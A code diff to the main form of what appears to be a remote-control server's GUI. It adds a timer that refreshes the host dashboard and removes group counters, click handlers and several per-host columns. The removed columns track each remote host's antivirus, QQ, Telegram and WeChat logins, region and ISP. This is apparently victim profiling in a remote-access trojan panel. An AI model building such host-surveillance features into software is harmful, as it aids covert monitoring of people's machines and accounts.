@@ -7,6 +7,23 @@ namespace RemoteControl.Server
 {
     public partial class FrmMain
     {
+        private System.Threading.Timer _clientListRefreshTimer;
+
+        private void ScheduleClientListRefresh()
+        {
+            if (_clientListRefreshTimer != null)
+                _clientListRefreshTimer.Dispose();
+
+            _clientListRefreshTimer = new System.Threading.Timer(_ =>
+            {
+                try
+                {
+                    this.BeginInvoke(new Action(RefreshHostDashboard));
+                }
+                catch { }
+            }, null, 800, System.Threading.Timeout.Infinite);
+        }
+
         private void RefreshHostDashboard()
         {
             if (hostListView == null)
@@ -105,7 +122,7 @@ namespace RemoteControl.Server
             if (session == null)
                 return new string[]
                 {
-                    "未知主机", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-"
+                    "未知主机", "-", "-", "-", "-", "-", "-", "-", "-", "-"
                 };
 
             return new string[]
@@ -118,13 +135,6 @@ namespace RemoteControl.Server
                 SafeText(session.OSVersion),
                 SafeText(session.Privilege),
                 SafeText(session.CameraStatus),
-                SafeText(session.Antivirus),
-                SafeText(session.OnlineQQ),
-                SafeText(session.TG),
-                SafeText(session.WX),
-                SafeText(session.UserStatus),
-                SafeText(session.Region),
-                SafeText(session.ISP),
                 SafeText(session.Remark),
                 FormatLastActive(session.LastActiveTime)
             };
@@ -145,88 +155,6 @@ namespace RemoteControl.Server
             if (span.TotalHours < 1)
                 return ((int)span.TotalMinutes) + " 分钟前";
             return value.ToString("HH:mm:ss");
-        }
-
-        private void UpdateDashboardCounters()
-        {
-            if (dashboardTabsPanel == null)
-                return;
-
-            Dictionary<string, int> counts = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
-            foreach (SocketSession session in onlineClientSessions)
-            {
-                string groupName = GetDashboardGroupName(session);
-                if (!counts.ContainsKey(groupName))
-                    counts[groupName] = 0;
-                counts[groupName]++;
-            }
-
-            int defaultCount = counts.ContainsKey(DefaultDashboardGroupName) ? counts[DefaultDashboardGroupName] : 0;
-            if (dashboardDefaultTab != null)
-            {
-                dashboardDefaultTab.Text = DefaultDashboardGroupName + "(" + defaultCount + ")";
-                ApplyDashboardTabState(dashboardDefaultTab,
-                    string.Equals(activeDashboardGroup, DefaultDashboardGroupName, StringComparison.OrdinalIgnoreCase));
-            }
-
-            List<string> groups = new List<string>(counts.Keys);
-            groups.Sort(StringComparer.OrdinalIgnoreCase);
-            foreach (string groupName in groups)
-            {
-                if (string.Equals(groupName, DefaultDashboardGroupName, StringComparison.OrdinalIgnoreCase))
-                    continue;
-                EnsureDashboardGroupTab(groupName, counts[groupName]);
-            }
-
-            List<string> staleGroups = new List<string>();
-            foreach (string groupName in dashboardGroupTabs.Keys)
-            {
-                if (!counts.ContainsKey(groupName))
-                    staleGroups.Add(groupName);
-            }
-            foreach (string groupName in staleGroups)
-            {
-                Button button = dashboardGroupTabs[groupName];
-                dashboardGroupTabs.Remove(groupName);
-                if (button != null)
-                {
-                    dashboardTabsPanel.Controls.Remove(button);
-                    button.Dispose();
-                }
-            }
-        }
-
-        private void hostListView_MouseUp(object sender, MouseEventArgs e)
-        {
-            ListViewHitTestInfo hit = hostListView.HitTest(e.Location);
-            if (hit.Item != null)
-            {
-                hit.Item.Selected = true;
-                SelectDashboardSession(hit.Item.Tag as SocketSession);
-            }
-            if (e.Button == MouseButtons.Right && contextMenuStripClient != null)
-                contextMenuStripClient.Show(hostListView, e.Location);
-        }
-
-        private void hostListView_DoubleClick(object sender, EventArgs e)
-        {
-            if (hostListView.SelectedItems.Count < 1)
-                return;
-            SelectDashboardSession(hostListView.SelectedItems[0].Tag as SocketSession);
-            onMenuFileManager(sender, e);
-        }
-
-        private void SelectDashboardSession(SocketSession session)
-        {
-            if (session == null)
-                return;
-
-            this.currentSession = session;
-            session.Touch();
-            UpdateSelectedClientInfo(session);
-            if (RSCApplication.oRemoteControlServer != null)
-                RSCApplication.oRemoteControlServer.SelectClient(session.SocketId);
-            UpsertHostDashboardClient(session);
         }
     }
 }
